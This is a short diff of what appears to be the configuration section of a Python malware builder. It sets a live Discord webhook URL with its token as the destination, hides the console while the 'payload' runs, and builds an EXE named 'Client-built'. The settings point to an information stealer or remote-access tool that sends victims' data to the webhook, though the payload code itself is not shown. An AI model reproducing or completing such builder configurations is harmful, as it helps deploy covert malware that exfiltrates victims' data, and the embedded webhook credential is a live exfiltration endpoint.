@@ -17,12 +17,12 @@ except ImportError:
 
 version = "1.0"
 
-webhook = "" # Webhook URL
+webhook = "https://discord.com/api/webhooks/1335514430850601071/50AL7KFqOMpFHHkGHDNUaOIrSySXAgUpxVWR9ZpirH0m-wZbnfz_fHod-VxlBPq-OoTU" # Webhook URL
 obfuscate = False # Obfuscate the payload
-hideConsole = False # Hide the console when the payload is ran
+hideConsole = True # Hide the console when the payload is ran
 forceRead = False
 virtualenvir = False
-inputFileName = "" # Input file name
+inputFileName = "Client-built" # Input file name
 comboBoxFileType = "EXE" # File type
 
 def build():
